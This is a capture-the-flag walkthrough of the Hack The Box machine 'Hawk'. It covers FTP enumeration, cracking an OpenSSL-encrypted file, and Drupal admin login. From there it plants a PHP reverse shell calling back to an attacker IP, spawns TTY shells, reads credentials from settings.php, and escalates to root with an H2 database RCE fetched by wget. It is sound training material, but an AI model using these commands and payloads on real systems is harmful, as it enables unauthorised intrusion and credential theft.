# Hawk
## Reconnaissance
### Use NmapAutomator for initial Scanning
```bash
sudo ./nmapAutomator.sh 10.10.10.102 All
```
* Result

![1](https://user-images.githubusercontent.com/53956303/132576780-1034fe2b-1344-4997-8bd4-ad7d1711f529.png)
![2](https://user-images.githubusercontent.com/53956303/132576842-5cb62bcf-5d3a-4586-8737-71a682418134.png)
## Enumeration
## Port 21
### FTP Enumeration
#### Access to FTP as Anonymous
```bash
ftp 10.10.10.102
ls -la
```
From the FTP server, a directory "messages" is found
#### Enumerate "messages" directory
* From the directory, a file `.drupal.txt.enc` is found
  * Download the file to enumerate
```bash
cd messages
get .drupal.txt.enc
```
![3](https://user-images.githubusercontent.com/53956303/132581149-27223f96-adc8-4a5c-b2cd-fa70aa31f068.png)

### Enumerate the file
```bash
file .drupal.txt.enc
```
* That file is a openssl base64 encoded salted password

![4](https://user-images.githubusercontent.com/53956303/132581054-82c2d249-ec28-4ee4-b4af-faa5644eb51b.png)
### Decode the file using base64
```bash
cat .drupal.txt.enc | base64 -d > drupal.txt.decoded
```
#### Confirm the file
```bash
file drupal.txt.decoded
```
* it became openssl salted password

![5](https://user-images.githubusercontent.com/53956303/132581708-c3d0b70a-2e11-4ca3-9ae9-ad11da490400.png)
### Crack the Openssl encrypted data with salted password
#### Install "bruteforce-salted-openssl" to crack the Openssl salted password
* Install an application to crack the file
```bash
sudo apt-get install bruteforce-salted-openssl
```
#### Use the application to crack
* use `-f` flag for a word list (Dictionary mode)
```bash
bruteforce-salted-openssl -f /usr/share/wordlists/rockyou.txt drupal.txt.decoded
```
* However, the password is not cracked

![6](https://user-images.githubusercontent.com/53956303/132582276-391e1e0a-e65f-4d02-a0c9-290df1832a2e.png)
#### Use sha256 option
* Since the result from the bruteforce mentioned a default digest, use SHA256 which is default digest for OpenSSL 1.1.x
```bash
bruteforce-salted-openssl -f /usr/share/wordlists/rockyou.txt -d sha256 drupal.txt.decoded
```
* From the result, a password candidate is found
  * `friends`    

![7](https://user-images.githubusercontent.com/53956303/132582792-38c8c741-0237-44dc-9de2-c56c49bd8825.png)
### Decrypt the file using password
* The digest is SHA256 and cipher used is _AES-256-CBC_ because that is the default cipher that the progrtam uses if it is not specified
```bash
openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k friends
```
* From the result, a password for the portal is found
  * `PencilKeyboardScanner123`

![8](https://user-images.githubusercontent.com/53956303/132583398-a81811a7-0396-45bd-a00b-caf77364d9ae.png)
## Port 80
* From the Port 80, a Drupal using web page is found

![9](https://user-images.githubusercontent.com/53956303/132583645-a640e871-9a84-4c6d-b546-5fb265d28df5.png)
* Using the obtained password with "admin" as a username, the access is granted to the portal as Admin

![10](https://user-images.githubusercontent.com/53956303/132583851-9b1e53f1-7970-491c-aebb-3f4bce0831a1.png)
* Since the page is using Drupal, a version number might be found on page source
 * From the page source, a version number `Drupal 7` is found

![11](https://user-images.githubusercontent.com/53956303/132584227-06bfd643-c51d-41af-9896-666b40785152.png)

### Test PHP function
* Since the application is Drupal 7, the PHP function can be used for exploitation
#### Change Configuration to use PHP function
* Enable PHP function at `Modules => Check "PHP Filter" => Save Configuration`

![12](https://user-images.githubusercontent.com/53956303/132584694-e06e4849-6de4-4a80-a4ef-fdc477f9d285.png)

### Test the PHP function
* Put `phpinfo` at `Content => Add Content => Article` then change the format using `Text format => PHP code => Preview`
```php
<?php phpinfo(); ?>
```
![13](https://user-images.githubusercontent.com/53956303/132585232-ff2f7f84-446e-4cb6-9ba5-0659b0d62f04.png)
* After put the content, click the "Preview" button at the bottom to execute the code

![14](https://user-images.githubusercontent.com/53956303/132585382-564ae460-3cfe-4cf1-85a7-7e95db7984ed.png)
* As a result, a PHP info page is given

![15](https://user-images.githubusercontent.com/53956303/132585456-fe1ffddc-7c3c-4e07-98a8-3b828bc21bef.png)
* It means that the PHP code that is put as content is worked

## Initial Foothold
* Since the PHP code is worked, use it to get an initial reverse shell
### Open a Netcat Listenr
```bash
sudo nc -lnvp 4444
```
### Use PHP code to get a Reverse Shell
* Put this code as a content and click "Preview" button to tirgger the PHP code
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.17/4444 0>&1'"); ?>
```
* As a result, a reverse shell as "www-data" user is open

![16](https://user-images.githubusercontent.com/53956303/132586079-a2135bdf-ff99-43d3-bf8d-cb253f7293ef.png)
### Getting a Stable Shell
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
ctrl + z
stty raw -echo
fg
export TERM=xterm-256color
```
## Privilege Escalation (www-data => daniel)
### Local Enumeration
* Enumearte Drupal default configuration file `/var/www/html/sites/default/settings.php`
```bash
cat settings.php | grep pass*
```
* From the file, a password `drupal4hawk` is found

![17](https://user-images.githubusercontent.com/53956303/132586829-2924067a-5862-45fa-b9cc-c2e11a0aa2c8.png)
* It can be used somewher. However, there has another user `daniel` is found from the `/home` directory, try to use the password to login as Daniel
```bash
su daniel
#password: drupal4hawk
```
* However, the shell for daniel is set to python

![18](https://user-images.githubusercontent.com/53956303/132587114-6b728dda-b183-4871-9711-8def174e7217.png)
### Spawning TTY shell on Python
[Spawning TTY shell](https://netsec.ws/?p=337)
* Since there has a technique using python `os` library, use it to spwan a shell
```python
import os
os.system("/bin/bash")
```
* As a result, a shell as "daniel" is open

![19](https://user-images.githubusercontent.com/53956303/132587517-a1ac1984-31b9-4108-921d-60df553ad96c.png)
## Privilege Escalation (Daniel => Root)
### Exploit H2 to escalate the privileges
* Since from the NmapAutomator, H2 database is found on Port 8082, searching for an exploit
 * From ExploitDB, an exploit for [H2 Database 1.4.196 - Remote Code Execution](https://www.exploit-db.com/exploits/45506) is found

### Transfer the exploit using Python http server and wget
#### Open a Python Http server on Kali
```bash
sudo python3 -m http.server 80
```
#### Downalod the exploit on the Target machine
* Since `/dev/shm` will be automatically reset after rebooting, use this directory
```bash
cd /dev/shm
wget http://10.10.14.17/exploit.py
```
### Execute the exploit
* This exploit needs a `-H` parameter to set a host
```bash
python3 exploit.py -H 127.0.0.1:8082
```
* As a result, a H2-shell as root is open

![20](https://user-images.githubusercontent.com/53956303/132589648-3113183f-678f-4683-b6b5-7b64f763c0dd.png)
